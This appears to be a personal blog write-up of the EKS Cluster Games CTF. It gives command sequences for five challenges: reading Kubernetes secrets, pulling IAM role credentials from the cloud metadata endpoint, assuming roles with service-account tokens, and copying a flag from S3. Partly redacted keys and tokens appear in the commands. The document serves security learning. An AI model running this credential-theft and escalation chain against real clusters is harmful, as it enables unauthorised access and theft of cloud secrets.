---
layout: post
title:  the eks cluster games CTF writeup
tags: [tech,ctf,eks]
---

eks cluster games ctf writeup, https://eksclustergames.com/

## challenge 1
```
kubectl get secrets
kubectl describe secret log-rotate
kubectl get secret log-rotate -o json
kubectl get secret log-rotate  --output="jsonpath={.data.flag}" | base64 --decode
```

## challenge 2
```
kubectl get  pods
kubectl get  pod database-pod-2c9b3a4e -o yaml
kubectl get pod registry-pull-secrets-780bab1d
kubectl get secret registry-pull-secrets-780bab1d -o json
//decode dockerconfigjson to get auth eksclustergames:dckr_pa_REDACTED_m4lr45iYQj8FuCo
crane auth login docker.io  --username eksclustergames -p dckr_p_REDACTED_m4lr45iYQj8FuCo
crane config docker.io/eksclustergames/base_ext_image
```

## challenge 3
```
kubectl get pods
kubectl get pod accounting-pod-876647f8 -o yaml

```
Hint 1 `Try contacting the IMDS to get the ECR credentials.`
这一步没有想到，ssrf的利用方式之一
```
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole

{"AccessKeyId":"ASIA2_REDACTED_MV2NRJPRJ","Expiration":"2024-08-05 08:51:55+00:00","SecretAccessKey":"AmuSPA_REDACTED_QvzLWk0PJ03","SessionToken":"FwoGZXIvYX_REDACTED_3smTRKG7Ehw"}

export AWS_ACCESS_KEY_ID=ASIA2_REDACTED_JPRJ && export AWS_SECRET_ACCESS_KEY="AmuSP_REDACTED_WV0PJ03" && export AWS_SESSION_TOKEN="FwoGZXIv_REDACTED_TRKG7Ehw" && aws ecr get-login-password

crane auth login 688655246681.dkr.ecr.us-west-1.amazonaws.com -u AWS -p eyJwYXlsb2FkIjoia_REDACTED_

crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
```


## challenge 4
```
aws sts get-caller-identity
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole

```
Hint 1
```
Can't determine the cluster's name?
The convention for the IAM role of a node follows the pattern: [cluster-name]-nodegroup-NodeInstanceRole.
```
Hint 2
```
EKS supports IAM authentication. Nodes connect to the cluster the same way users do. Check out the documentation.

https://docs.aws.amazon.com/eks/latest/userguide/cluster-auth.html
```
参考网络writeup
```
aws eks get-token --cluster-name eks-challenge-cluster
kubectl auth can-i --list --token="k8s-aws-v1.aHR0cHM6Ly_REDACTED_zFCakl0cDZXc2xWbHlZJTJGJTJCOGJ4V2dGU3lvRHdPdmZlRjdvNkVkUzNOelRybW9qQmswUUlmMHd4WTNJaXBtN0FINSZYLUFtei1TaWduYXR1cmU9N2EwZDM4M2RkZDFjZTNhZGExNGYzYzhjYjJhNjAzYmU3ZjU3YmQ4YzgwM2U1YTBiYmI0MGY0ZjBkOWZmMzg1Nw"

kubectl get secrets --token="k8s-aws-v1.aHR0cHM6Ly9_REDACTED_dHFhNm45ckFqbkxVUWQ0N3lqNUh4Q3JuTWFZY0d6M2tNTUZ0ajhtRXoyb0NjYmhRMFlrMnAySFJvTGMwNlU4RWFRbk1OWTJldFNpTXJNSzFCakl0cDZXc2xWbHlZJTJGJTJCOGJ4V2dGU3lvRHdPdmZlRjdvNkVkUzNOelRybW9qQmswUUlmMHd4WTNJaXBtN0FINSZYLUFtei1TaWduYXR1cmU9N2EwZDM4M2RkZDFjZTNhZGExNGYzYzhjYjJhNjAzYmU3ZjU3YmQ4YzgwM2U1YTBiYmI0MGY0ZjBkOWZmMzg1Nw"

kubectl get secret node-flag -o json --token="k8s-aws-v1.aHR0cH_REDACTED_l0cDZXc2xWbHlZJTJGJTJCOGJ4V2dGU3lvRHdPdmZlRjdvNkVkUzNOelRybW9qQmswUUlmMHd4WTNJaXBtN0FINSZYLUFtei1TaWduYXR1cmU9N2EwZDM4M2RkZDFjZTNhZGExNGYzYzhjYjJhNjAzYmU3ZjU3YmQ4YzgwM2U1YTBiYmI0MGY0ZjBkOWZmMzg1Nw"
```

## challenge 5
```
kubectl auth can-i --list
kubectl get serviceaccounts
kubectl get serviceaccount s3access-sa -o yaml
```

参考网络writeup
```
kubectl create token debug-sa --audience='sts.amazonaws.com'
```
```
aws sts assume-role-with-web-identity --role-session-name "s3accessAuth_Role"  --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --web-identity-token 'eyJhbGciOiJSUzI_REDACTED_2RmafO1rYrVNk42tNXW_6D4Q0oOv3s-TSIU9NWaJZ5ixqao-MLRYEoJarqe82_8HoObDDprPMeb-Dp9bXUB79qsyr32KREUXULoJcZ4OvUj7esJwJ64kgdLStMZOr_zzJ4mw'
```

```
export AWS_ACCESS_KEY_ID="ASIA2A_REDACTED_ORAHYC" && export AWS_SECRET_ACCESS_KEY="MB50pyik199/DbF_REDACTED_dWTX5" && export AWS_SESSION_TOKEN="IQoJb3JpZ2luX_REDACTED_Ua4r7vC1G9Fn5OcarYyXRF6Q0vTVHeLO1kNESx2o7kjFVfhOEhWXAOnkYw17h8PHjBU78d" && aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag /tmp/ff.txt && cat /tmp/ff.txt
```

后面的部分同big iam challenge 第6题。
